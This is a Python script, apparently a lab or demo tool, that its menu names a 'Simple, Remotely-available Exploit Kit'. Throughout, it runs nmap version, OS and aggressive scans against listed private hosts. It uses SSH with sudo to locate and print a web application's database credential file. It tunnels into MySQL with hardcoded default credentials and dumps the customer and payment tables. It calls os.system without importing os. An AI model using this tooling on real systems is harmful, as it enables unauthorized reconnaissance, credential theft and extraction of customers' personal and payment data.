from consolemenu import *
from consolemenu.items import *
import subprocess
import pymysql
import paramiko
import pandas as pd
import sys
from paramiko import SSHClient
from sshtunnel import SSHTunnelForwarder
from os.path import expanduser

hostname = "192.168.92.120"
username = [changeme]
password = [changeme]

commands = [
    "sudo find /var/www/ -name database*",
    "sudo cat /var/www/html/config/databases.yml"
]

sql_hostname = '192.168.92.181'
sql_username = 'siwapp'
sql_password = 'siwapp'
sql_main_database = 'siwapp'
sql_port = 3306


def dbSearch():
    # initialize the SSH client
    client = paramiko.SSHClient()
    # add to known hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password)
    except:
        print("[!] Cannot connect to the SSH Server")
        exit()

    # execute the commands
    for command in commands:
        print("="*50, command, "="*50)
        stdin, stdout, stderr = client.exec_command(command)
        print(stdout.read().decode())
        err = stderr.read().decode()
        input("Press Enter to continue...")
        if err:
            print(err)


def flushTables():
    with SSHTunnelForwarder(
            (hostname, 22),
            ssh_username=username,
        ssh_password=password,
            remote_bind_address=(sql_hostname, sql_port)) as tunnel:
        conn = pymysql.connect(host='127.0.0.1', user=sql_username,
                               passwd=sql_password, db=sql_main_database,
                               port=tunnel.local_bind_port)
        query = [
            '''SHOW TABLES;''',
            '''select * from customer;''',
            '''select * from payment;'''
        ]

        for command in query:
            print("="*50, command, "="*50)
            data = pd.read_sql_query(command, conn)
            print(data)
            input("Press Enter to continue...")

        conn.close()


def simpleNmapScan():
    if 'win' in sys.platform:
        subprocess.call(
            [r'C:\Users\jlunde\Downloads\exploit-kit\simpleNmap.bat'])
    elif 'linux' in sys.platform:
        os.system('echo Search for hosts running common management')
        os.system('echo SSH on tcp/22')
        os.system('echo Telnet on tcp/23')
        os.system('echo Remote Desktop on tcp/3389')
        os.system('echo Using nmap the following commands will run')
        os.system('echo =============================================================================================================================================')
        os.system('nmap -sV -T4 -O -F --version-light 192.168.93.30 192.168.93.31 192.168.93.37 192.168.93.43 192.168.93.44 192.168.93.45 192.168.93.48 192.168.93.49')


def aggressiveNmapScan():
    if 'win' in sys.platform:
        subprocess.call(
            [r'C:\Users\jlunde\Downloads\exploit-kit\aggressiveNmap.bat'])
    elif 'linux' in sys.platform:
        os.system('echo ==============================================================================================================================')
        os.system('nmap -T4 -A -v 192.168.93.30 192.168.93.31 192.168.93.37 192.168.93.43 192.168.93.44 192.168.93.45 192.168.93.48 192.168.93.49')


def main():
    # Create the menu
    menu = ConsoleMenu(
        "Simple, Remotely-available Exploit Kit", "The answer is 42...")
    # A FunctionItem runs a Python function when selected
    simpleNmap = FunctionItem("Run a simple NMAP Scan", simpleNmapScan)
    aggressiveNmap = FunctionItem(
        "Run a aggressive NMAP Scan", aggressiveNmapScan)
    databaseSearch = FunctionItem("Search for Database Files", dbSearch)
    flushDB = FunctionItem("Connect to and search DB", flushTables)

    # A CommandItem runs a console command
    command_item = CommandItem("Run a console command",  "touch hello.txt")
    # Once we're done creating them, we just add the items to the menu
    menu.append_item(simpleNmap)
    menu.append_item(aggressiveNmap)
    menu.append_item(databaseSearch)
    menu.append_item(flushDB)
    menu.append_item(command_item)
    # Finally, we call show to show the menu and allow the user to interact
    menu.show()


if __name__ == '__main__':
    main()
